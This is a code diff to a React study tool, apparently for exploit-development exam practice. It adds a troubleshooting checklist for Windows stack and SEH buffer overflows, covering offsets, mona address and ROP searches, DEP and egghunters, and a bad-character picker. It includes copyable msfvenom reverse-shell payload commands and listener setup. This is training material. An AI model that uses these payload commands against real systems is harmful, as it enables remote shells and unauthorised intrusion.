@@ -250,6 +250,15 @@ const CSS=`
 .decision-btn{display:block;width:100%;padding:10px 14px;margin-bottom:6px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;color:var(--t0);font-family:var(--s);font-size:12px;font-weight:600;cursor:pointer;text-align:left;transition:all .15s}
 .decision-btn:hover{border-color:var(--ac);background:var(--acd)}
 .decision-btn.active{border-color:var(--ac);background:var(--acd);color:var(--ac)}
+.stuck-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:12px 14px;margin-bottom:8px}
+.stuck-q{font-size:13px;font-weight:700;color:var(--t0);margin-bottom:4px}
+.stuck-tip{font-size:11px;color:var(--t2);margin-bottom:6px}
+.bc-grid{display:grid;grid-template-columns:repeat(16,1fr);gap:3px;margin-bottom:14px}
+.bc-cell{aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-family:var(--m);font-size:9px;font-weight:600;border-radius:4px;cursor:pointer;transition:all .15s;border:1px solid var(--bd);background:var(--b0);color:var(--cg)}
+.bc-cell:hover{border-color:var(--ac)}
+.bc-cell.bad{background:rgba(239,68,68,.15);border-color:var(--r);color:var(--r);text-decoration:line-through}
+.bc-out{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:10px 14px;margin-bottom:8px}
+.bc-label{font-size:10px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
 `;
 
 // ━━━ COMPONENTS ━━━
@@ -388,8 +397,90 @@ function NotesTab(){
   </div>)
 }
 
+// ━━━ TAB: I'M STUCK ━━━
+function StuckTab(){
+  const checks=[
+    { q: "Did you verify the EXACT EIP/nSEH offset?", cmd: "# Generate unique pattern:\nmsf-pattern_create -l 5000\n\n# After crash, find offset:\nmsf-pattern_offset -l 5000 -q EIP_VALUE\n\n# Verify: A*offset + BBBB should give EIP=42424242\nimport struct\nbuf = b'A'*OFFSET + struct.pack('<I', 0x42424242) + b'C'*500", tip: "If EIP isn't exactly 0x42424242, your offset is wrong. Recheck with a fresh pattern.", critical: true },
+    { q: "Did you find ALL bad characters?", cmd: "# Send 0x00-0xFF after EIP:\nbadchars = bytes(range(0,256))\n\n# In WinDbg: db esp L100\n# Compare byte-by-byte with expected sequence\n# Common bad: 0x00, 0x0a, 0x0d, 0x20, 0x25\n# Remove bad char and RE-TEST — one bad char can mask others!", tip: "ALWAYS re-test after removing each bad char. One bad char can truncate or corrupt subsequent bytes.", critical: true },
+    { q: "Is your JMP ESP / PPR address correct?", cmd: "# JMP ESP (stack overflow):\n!mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\"\n\n# POP POP RET (SEH overflow):\n!mona seh -cpb \"\\x00\\x0a\\x0d\"\n\n# CHECK:\n# 1. Module has NO ASLR + NO SafeSEH (for SEH)\n# 2. Address contains NO bad chars\n# 3. Address is correct endianness (little-endian)", tip: "Triple-check: the address bytes themselves must not contain bad characters! And the module must not have ASLR.", critical: true },
+    { q: "Is DEP blocking your shellcode?", cmd: "# Check if DEP is enabled:\n!mona modules  # look for DEP column\n\n# If DEP is ON: you need ROP chain!\n# Generate ROP gadgets:\n!mona rop -m \"module.dll\" -cpb \"\\x00\"\n\n# Build VirtualProtect / VirtualAlloc chain", tip: "If your shellcode lands correctly but nothing executes, DEP is probably blocking it. You need ROP.", critical: true },
+    { q: "Are you accounting for stack alignment?", cmd: "# ESP must be 16-byte aligned for some operations\n# Add alignment NOPs or SUB ESP instructions\n\n# Check ESP value after JMP ESP lands:\n# In WinDbg: ? esp & f\n# If not 0, add: sub esp, N to align", tip: "Stack misalignment can cause silent crashes. Add NOP sled (\\x90 * 16) before shellcode." },
+    { q: "Is your shellcode too large for the buffer?", cmd: "# Check available space after EIP control:\n# In WinDbg: db esp L500\n# Count writable bytes\n\n# If < 400 bytes: use EGGHUNTER\n!mona egg -t w00t -cpb \"\\x00\"\n# Egghunter = ~32 bytes, searches memory for your full shellcode", tip: "If your buffer is too small, use an egghunter. Place the real shellcode in a different input/buffer.", critical: true },
+    { q: "Did you try a different shellcode encoder?", cmd: "# Default (shikata_ga_nai):\nmsfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -b '\\x00' -f python\n\n# Try different encoders:\nmsfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -e x86/alpha_mixed -f python\nmsfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -e x86/fnstenv_mov -f python", tip: "If one encoder's output contains bad chars, try a different encoder. Or use custom shellcode." },
+    { q: "Is your listener set up correctly?", cmd: "# Netcat:\nnc -nlvp 443\n\n# Metasploit (for staged payloads):\nmsfconsole -x 'use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST IP; set LPORT 443; run'\n\n# Check firewall isn't blocking!", tip: "Make sure listener matches payload type: staged vs stageless, architecture (x86 vs x64)." },
+    { q: "Did you try the exploit multiple times?", cmd: "# Timing issues or ASLR may cause intermittent failures\n# Run exploit 3-5 times before giving up\n# Add small delays if needed:\nimport time; time.sleep(1)", tip: "Some exploits are unreliable due to timing. Try multiple times before changing approach." },
+  ];
+  return(<div>
+    <div className="score-bar"><div className="score-seg" style={{background:'rgba(239,68,68,.08)',color:'var(--r)',flex:2}}>{`⚠️ RULE: Verify each step before moving on. Exploit dev is sequential — one wrong byte breaks everything.`}</div></div>
+    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question. If you answer "no" to ANY, fix it before continuing.</p>
+    {checks.map((c,i)=><div className="stuck-card" key={i}>
+      <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
+        <div className={`phase-num`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
+        <div style={{flex:1}}>
+          <div className="stuck-q">{c.q}</div>
+          <div className="stuck-tip">{c.tip}</div>
+        </div>
+        <CopyBtn text={c.cmd}/>
+      </div>
+      <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
+    </div>)}
+  </div>)
+}
+
+// ━━━ TAB: BAD CHARS ━━━
+function BadCharsTab(){
+  const[bad,setBad]=useState({0:true}); // 0x00 is almost always bad
+  const toggle=(b)=>setBad(p=>({...p,[b]:!p[b]}));
+  const allBytes=Array.from({length:256},(_,i)=>i);
+  const goodBytes=allBytes.filter(b=>!bad[b]);
+  const badBytes=allBytes.filter(b=>bad[b]);
+  const pyGood=`badchars = (\n${goodBytes.reduce((acc,b,i)=>{acc+=`\\x${b.toString(16).padStart(2,'0')}`;if((i+1)%16===0&&i<goodBytes.length-1)acc+='"\n  b"';return acc},'  b"')}"\n)`;
+  const pyBad=badBytes.map(b=>`\\x${b.toString(16).padStart(2,'0')}`).join('');
+  const monaBad=badBytes.map(b=>`\\x${b.toString(16).padStart(2,'0')}`).join('');
+  return(<div>
+    <div className="sec-title">Click to toggle bad characters ({badBytes.length} bad, {goodBytes.length} clean)</div>
+    <div className="bc-grid">
+      {allBytes.map(b=>(
+        <div key={b} className={`bc-cell ${bad[b]?'bad':''}`} onClick={()=>toggle(b)} title={`0x${b.toString(16).padStart(2,'0')} (${b})`}>
+          {b.toString(16).padStart(2,'0')}
+        </div>
+      ))}
+    </div>
+    <div className="sec-title">Quick Toggle</div>
+    <div style={{display:'flex',gap:6,marginBottom:14,flexWrap:'wrap'}}>
+      {[{label:"+ NULL (00)",bytes:[0]},{label:"+ LF (0a)",bytes:[0x0a]},{label:"+ CR (0d)",bytes:[0x0d]},{label:"+ Space (20)",bytes:[0x20]},{label:"Reset All",bytes:[]}].map((preset,i)=>(
+        <button key={i} className="timer-btn" onClick={()=>{
+          if(preset.bytes.length===0){setBad({0:true});return;}
+          setBad(p=>{const n={...p};preset.bytes.forEach(b=>n[b]=true);return n});
+        }}>{preset.label}</button>
+      ))}
+    </div>
+    <div className="bc-out">
+      <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:4}}>
+        <div className="bc-label">Python badchars (for testing) — {goodBytes.length} bytes</div>
+        <CopyBtn text={pyGood}/>
+      </div>
+      <div className="cmd" style={{fontSize:10}}>{pyGood}</div>
+    </div>
+    <div className="bc-out">
+      <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:4}}>
+        <div className="bc-label">Bad chars string (for -b flag / mona)</div>
+        <CopyBtn text={monaBad}/>
+      </div>
+      <div className="cmd" style={{fontSize:10}}>{`-b "${monaBad}"`}</div>
+    </div>
+    <div className="bc-out">
+      <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:4}}>
+        <div className="bc-label">msfvenom exclude</div>
+        <CopyBtn text={`msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -b "${pyBad}" -f python -v shellcode`}/>
+      </div>
+      <div className="cmd" style={{fontSize:10}}>{`msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -b "${pyBad}" -f python -v shellcode`}</div>
+    </div>
+  </div>)
+}
+
 // ━━━ MAIN APP ━━━
-const TABS=["🎯 Decision Engine","⚡ Quick Ref","✅ Checklist","⏱ Timer","📝 Notes"];
+const TABS=["🎯 Decision Engine","⚡ Quick Ref","🆘 I'm Stuck","🔢 Bad Chars","✅ Checklist","⏱ Timer","📝 Notes"];
 
 function App(){
   const[tab,setTab]=useState(0);
@@ -419,9 +510,11 @@ function App(){
       <div className="main">
         {tab===0&&<DecisionTab vals={vals}/>}
         {tab===1&&<QuickRefTab/>}
-        {tab===2&&<ChecklistTab/>}
-        {tab===3&&<TimerTab/>}
-        {tab===4&&<NotesTab/>}
+        {tab===2&&<StuckTab/>}
+        {tab===3&&<BadCharsTab/>}
+        {tab===4&&<ChecklistTab/>}
+        {tab===5&&<TimerTab/>}
+        {tab===6&&<NotesTab/>}
       </div>
     </div>
   </>)
